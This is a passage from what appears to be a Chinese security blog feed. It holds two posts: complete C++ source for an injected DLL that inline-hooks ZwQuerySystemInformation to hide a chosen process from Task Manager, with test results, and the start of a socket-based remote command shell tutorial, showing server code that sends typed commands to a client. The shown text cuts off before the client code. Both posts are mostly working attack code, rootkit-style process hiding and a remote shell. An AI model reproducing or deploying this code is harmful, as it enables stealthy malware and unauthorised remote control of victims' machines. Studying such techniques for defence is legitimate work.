class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">hookZwQuerySystemInformation</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//获取ZwQuerySystemInformation的地址</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    BYTE pData[<span class="hljs-number">12</span>] = &#123; <span class="hljs-number">0x48</span>,<span class="hljs-number">0xb8</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0xFF</span>,<span class="hljs-number">0xE0</span> &#125;;<br>    ULONGLONG InfoAddr = (ULONGLONG)New_ZwQuerySystemInformation;<br>    ::<span class="hljs-built_in">RtlCopyMemory</span>(&amp;pData[<span class="hljs-number">2</span>], &amp;InfoAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(InfoAddr));<br>    <span class="hljs-comment">// 保存前 12 字节数据</span><br>    ::<span class="hljs-built_in">RtlCopyMemory</span>(g_Oldwin64, ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    BYTE pData[<span class="hljs-number">5</span>] = &#123; <span class="hljs-number">0xe9</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span>,<span class="hljs-number">0x0</span> &#125;;<br>    <span class="hljs-comment">//算出偏移地址</span><br>    DWORD dwOffeset = (DWORD)New_ZwQuerySystemInformation - (DWORD)ZwQuerySystemInformation - <span class="hljs-number">5</span>;<br>    <span class="hljs-comment">//得到完整的pData</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(&amp;pData[<span class="hljs-number">1</span>], &amp;dwOffeset, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(dwOffeset));<br>    <span class="hljs-comment">//保存原来的硬编码</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(g_Oldwin32, ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    DWORD dwOldProtect = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//修改为可写属性,不然会0xC00005访问错误</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData), PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//修改硬编码</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, pData, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData));<br>    <span class="hljs-comment">//还原保护属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(pData), dwOldProtect, &amp;dwOldProtect);<br>&#125;<br></code></pre></td></tr></table></figure><p>unhook函数</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">unhookZwQuerySystemInformation</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//获取ZwQuerySystemInformation的地址</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    DWORD dwOldProtect = <span class="hljs-literal">NULL</span>;<br>    <span class="hljs-comment">//方便就直接改12个字节的可写属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-number">12</span>, PAGE_EXECUTE_READWRITE, &amp;dwOldProtect);<br>    <span class="hljs-comment">//还原原来的硬编码</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, g_Oldwin64, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(g_Oldwin64));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-built_in">RtlCopyMemory</span>(ZwQuerySystemInformation, g_Oldwin32, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(g_Oldwin32));<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span><br>    <span class="hljs-comment">//还原属性</span><br>    <span class="hljs-built_in">VirtualProtect</span>(ZwQuerySystemInformation, <span class="hljs-number">12</span>, dwOldProtect, &amp;dwOldProtect);<br>&#125;<br></code></pre></td></tr></table></figure><p>自己可控的函数,即<code>New_ZwQuerySystemInformation</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">NTSTATUS WINAPI <span class="hljs-title">New_ZwQuerySystemInformation</span><span class="hljs-params">(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)</span></span><br><span class="hljs-function"></span>&#123;<br>    NTSTATUS status = <span class="hljs-literal">NULL</span>;<br>    PSYSTEM_PROCESS_INFORMATION pCur = <span class="hljs-literal">NULL</span>, pPrev = <span class="hljs-literal">NULL</span>;<br>    DWORD dwHideProcessId = <span class="hljs-number">29936</span>;<br>    <span class="hljs-comment">//先卸载钩子</span><br>    <span class="hljs-built_in">unhookZwQuerySystemInformation</span>();<br><br>    <span class="hljs-comment">// 获取 ntdll.dll 的加载基址, 若没有则返回</span><br>    HMODULE hntdll = <span class="hljs-built_in">LoadLibraryA</span>(<span class="hljs-string">&quot;ntdll.dll&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!hntdll) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Load ntdll Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br>    <span class="hljs-comment">// 获取 ZwQuerySystemInformation 函数地址</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> _WIN64</span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><br>    <span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">DWORD</span><span class="hljs-params">(WINAPI* typedef_ZwQuerySystemInformation)</span><span class="hljs-params">(</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Inout_   PVOID                    SystemInformation,</span></span><br><span class="hljs-params"><span class="hljs-function">        _In_      ULONG                    SystemInformationLength,</span></span><br><span class="hljs-params"><span class="hljs-function">        _Out_opt_ PULONG                   ReturnLength</span></span><br><span class="hljs-params"><span class="hljs-function">        )</span></span>;<br><span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span><br>    typedef_ZwQuerySystemInformation ZwQuerySystemInformation = (typedef_ZwQuerySystemInformation)::<span class="hljs-built_in">GetProcAddress</span>(hntdll, <span class="hljs-string">&quot;ZwQuerySystemInformation&quot;</span>);<br>    <span class="hljs-keyword">if</span> (!ZwQuerySystemInformation) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Get ZwQuerySystemInformation Addr Faild..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> status;<br>    &#125;<br>    <span class="hljs-comment">//调用原来的函数,第二个参数是返回请求的信息</span><br>    status = <span class="hljs-built_in">ZwQuerySystemInformation</span>(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">NT_SUCCESS</span>(status) &amp;&amp; <span class="hljs-number">5</span> == SystemInformationClass)<br>    &#123;<br>        pCur = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;<br>        <span class="hljs-keyword">while</span> (TRUE)<br>        &#123;<br>            <span class="hljs-comment">// 判断是否是要隐藏的进程PID,是就把该进程信息删除</span><br>            <span class="hljs-keyword">if</span> (dwHideProcessId == (DWORD)pCur-&gt;UniqueProcessId)<br>            &#123;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pCur-&gt;NextEntryOffset)<br>                &#123;<br>                    pPrev-&gt;NextEntryOffset = <span class="hljs-number">0</span>;<br>                &#125;<br>                <span class="hljs-keyword">else</span><br>                &#123;<br>                    pPrev-&gt;NextEntryOffset = pPrev-&gt;NextEntryOffset + pCur-&gt;NextEntryOffset;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span><br>            &#123;<br>                pPrev = pCur;<br>            &#125;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> == pCur-&gt;NextEntryOffset)<br>            &#123;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>            pCur = (PSYSTEM_PROCESS_INFORMATION)((BYTE*)pCur + pCur-&gt;NextEntryOffset);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">//挂钩</span><br>    <span class="hljs-built_in">hookZwQuerySystemInformation</span>();<br>    <span class="hljs-keyword">return</span> status;<br>&#125;<br></code></pre></td></tr></table></figure><p>以上函数全部写在dll中,<code>dllmain</code>主函数:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>        <span class="hljs-built_in">hookZwQuerySystemInformation</span>();<br>        g_hModule = hModule;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-built_in">unhookZwQuerySystemInformation</span>();<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h2><ul><li>win10</li><li>64位dll</li><li>Injectdll(进程注入程序)</li><li>Taskmgr.exe</li></ul><p>要注意的是dll的位数。<br>找到任务管理器pid:<br><img src="/img/HOOKZwQuerySystemInformation/5.png"></p><p>这里选择隐藏QQ程序<br><img src="/img/HOOKZwQuerySystemInformation/6.png"></p><p>注入程序后<br><img src="/img/HOOKZwQuerySystemInformation/7.png"></p><p><img src="/img/HOOKZwQuerySystemInformation/8.png"></p><p>可以看到QQ进程信息已经剔除</p><h2 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h2><p>如何将所有进程钩住?<br>使用全局钩子,这里我认为是两个知识点,就不继续展开说了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>socket之shell实现</title>
    <link href="/2021/06/21/RemoteCmd/"/>
    <url>/2021/06/21/RemoteCmd/</url>
    
    <content type="html"><![CDATA[<h2 id="Socket"><a href="#Socket" class="headerlink" title="Socket"></a>Socket</h2><p>Socket中文为”套接字”,实际上是windows的API,程序员无需知道<code>TCP/IP</code>的细节可直接调用网络编程接口,Socket中有两种通信协议可供选择</p><ul><li>TCP</li><li>UDP<br>TCP是安全的,在传输数据前必须建立连接,这个连接实际上是三次握手;UDP则是不安全的,但是他的效率是比TCP要高的,QQ实际上就是使用UDP协议<br>思路是非常简单的</li></ul><ol><li>Socket建立通信</li><li>客户端执行命令并返回结果</li></ol><h2 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h2><p>服务端(监听端):<br>服务器端初始化<code>Winsock</code>环境后，便调用Socket丽数创建流式套接字;然后对<code>sockadd_in</code>结构体进行设置，设置服务器绑定的IP地址和端口等信息并调用<code>bind</code>函数来绑定;绑定成功后，就可以调用<code>listen</code>函数设置连接数量，并进行监听。直到有来自客户端的连接请求，服务器便调用<code>accept</code>函数接受连接请求，建立连接。这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发</p><p>客户端(接收端):<br>客户端初始化环境后,便调用Socket函数创建流式套接字;然后对<code>sockaddr_in</code>结构体进行设置，设置服务器的IP地址和端口等信息并调用<code>connect</code>函数向服务器发送连接请求，并等待服务器响应。服务器接受连接请求后，就成功地与服务器建立连接，这时，可以使用<code>recv</code>函数和<code>send</code>函数与客户端进行数据收发。</p><p>为了方便理解画一个图<br><img src="/img/socket/1.png"></p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><p>创建一个函数,实现服务端的winsock初始化,创建流式socket,绑定服务端地址和端口和监听</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">BOOL <span class="hljs-title">SocketListen</span><span class="hljs-params">(LPSTR ipaddr,<span class="hljs-keyword">int</span> port)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//初始化winsock环境</span><br>    WSADATA wsadata = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">WSAStartup</span>(<span class="hljs-built_in">MAKEWORD</span>(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>), &amp;wsadata) == SOCKET_ERROR) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Failed to initialize Winsock character environment..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//创建流式socket</span><br>    g_SeverSocket = <span class="hljs-built_in">socket</span>(AF_INET,SOCK_STREAM,<span class="hljs-literal">NULL</span>);<br>    <span class="hljs-keyword">if</span> (g_SeverSocket == INVALID_SOCKET)<br>    &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] Socket Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置服务端地址和端口</span><br>    sockaddr_in ServerAddr;<br>    ServerAddr.sin_family = AF_INET;<br>    ServerAddr.sin_port = ::<span class="hljs-built_in">htons</span>(port);<br>    ServerAddr.sin_addr.S_un.S_addr = ::<span class="hljs-built_in">inet_addr</span>(ipaddr);<br>    <span class="hljs-comment">//绑定端口ip</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">bind</span>(g_SeverSocket, (LPSOCKADDR)&amp;ServerAddr, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(ServerAddr))) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] bind Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br>    <span class="hljs-comment">//设置监听,参数:已捆绑未连接的套接字描述字，正在等待连接的最大队列长度</span><br>    <span class="hljs-keyword">if</span> (<span class="hljs-literal">NULL</span> != ::<span class="hljs-built_in">listen</span>(g_SeverSocket, <span class="hljs-number">1</span>)) &#123;<br>        std::cout &lt;&lt; <span class="hljs-string">&quot;[!] listen Failed..\n&quot;</span>;<br>        <span class="hljs-keyword">return</span> FALSE;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>再等待客户端的连接,如果<code>accept</code>到一个客户端,就让用户在命令行输入命令,并将命令发送给客户端。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">VOID <span class="hljs-title">AcceptRecvMsg</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    sockaddr_in addr = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">int</span> len = <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(addr);<br>    <span class="hljs-comment">//接收客户端请求</span><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] Wait a Client connect..\n&quot;</span>;<br>    g_ClientSocket = ::<span class="hljs-built_in">accept</span>(g_SeverSocket, (LPSOCKADDR)&amp;addr, &amp;len);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] a Client connect..\n&quot;</span>;<br>    <span class="hljs-keyword">char</span> szBuffer[MAX_PATH] = &#123; <span class="hljs-number">0</span> &#125;;<br>    <span class="hljs-keyword">while</span> (TRUE)<br>    &#123;<br>        <span class="hljs-comment">//接收用户输入并发送给客户端</span><br>        <span class="hljs-built_in">SendCommand</span>();<br>        <span class="hljs-comment">//接收数据</span><br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)<br>        &#123;<br>            <span class="hljs-keyword">int</span> rRet = ::<span class="hljs-built_in">recv</span>(g_ClientSocket, szBuffer, MAX_PATH, <span class="hljs-number">0</span>);<br>            <span class="hljs-keyword">if</span> (rRet &lt;= <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-keyword">continue</span>;<br>            &#125;<br>            std::cout &lt;&lt; <span class="hljs-string">&quot;[+] recv:\n&quot;</span> &lt;&lt; szBuffer &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>        <br>    &#125;<br>&#125;<br><br><span class="hljs-function">VOID <span class="hljs-title">SendCommand</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">char</span> cmd[<span class="hljs-number">20</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br>    std::cout &lt;&lt; <span class="hljs-string">&quot; &gt;&quot;</span>;<br>    cin.<span class="hljs-built_in">getline</span>(cmd, <span class="hljs-number">20</span>);<br>    ::<span class="hljs-built_in">send</span>(g_ClientSocket, cmd, <span class="hljs-number">1</span> + <span class="hljs-built_in">strlen</span>(cmd), <span class="hljs-literal">NULL</span>);<br>    std::cout &lt;&lt; <span class="hljs-string">&quot;[+] sent:&quot;</span> &lt;&lt; cmd &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><p>客户端只需要在初始化环境后与服务端<code>connect</code></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 